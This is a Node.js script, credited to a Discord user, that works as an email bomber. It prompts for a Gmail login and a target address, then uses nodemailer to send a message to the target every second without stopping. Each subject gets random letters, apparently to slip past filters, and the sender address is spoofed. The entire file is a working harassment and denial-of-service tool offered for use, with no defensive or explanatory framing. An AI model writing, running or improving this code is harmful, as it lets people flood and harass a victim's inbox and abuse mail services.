/*
THIS BOMBER WAS CODED BY EXPLOIT#1337 ON DISCORD.

ORIGINAL IDEA: Mental#1424

Big thanks to mental for the idea!!!!

*/
const nodemailer = require("nodemailer");
const readline = require('readline');
  
     /*Big thanks to mental for this function <3 */
    function randomLetters(length) {
          var text = "";
          var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
          for (var i = 0; i < length; i++)
            text += possible.charAt(Math.floor(Math.random() * possible.length));
             return text;
    }
	
	/*START SETTING VARIABLES*/
	var mailto = "example@gmail.com"
	var subset = "Empty"
	var mailtxt = "haha rekt"
	var username = "none@gmail.com"
	var password = "noneset"
	var sname = "XoTic"
	/*END SETTING VARIABLES*/

/* Declaring Line Reader as rl */	
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

/* all of the line reader questions and setting them as vars */
rl.question('What is your gmail username for the spammer? ', (usern) => {	
	username = usern

rl.question('What is your gmail password for the spammer? ', (userpw) => {	  
   password = userpw

rl.question('What email do you want to bomb? ', (answer) => {
	   mailto = answer
	   
rl.question('What sender name do you want for the spammer? ', (snameset) => {	  
      sname = snameset
	  
rl.question('What subject do you want for the spammer? ', (subjset) => {	  
      subset = subjset

rl.question('What email body do you want for the spammer? ', (answerr) => {	  
	   mailtxt = answerr

	   console.log("MAKE SURE YOU HAVE LESS SECURE APPS ENABLED ON GMAIL SETTINGS!")
	   console.log("Email is now being bombed! Close the application to stop.")
       bombmail()

});
});
});
});
});
});


          /* mail function using nodemail */
        function bombmail() {



        let transporter = nodemailer.createTransport({
            host: "smtp.gmail.com", //smtp server
            port: 465, //smtp port
            secure: true, // true for 465, false for other ports
            auth: {
              user: username, 
              pass: password
            }
          });
        
          let mailOptions = {
            from: sname + ' <cleep@imcleep.com>',
            to: mailto,
            subject: (randomLetters(8)),
            text: mailtxt,
            html: "<b>" + mailtxt + "</b>"
          };

          async function sendMail() {
              let info = await transporter.sendMail(mailOptions)
              spamming = true;
          }

          const spammingMessage = setInterval(() => {
             mailOptions.subject = subset + " | " +(randomLetters(8))
             var mailtxt = (randomLetters(10))
             
			 sendMail();
                      
          }, 1000);
}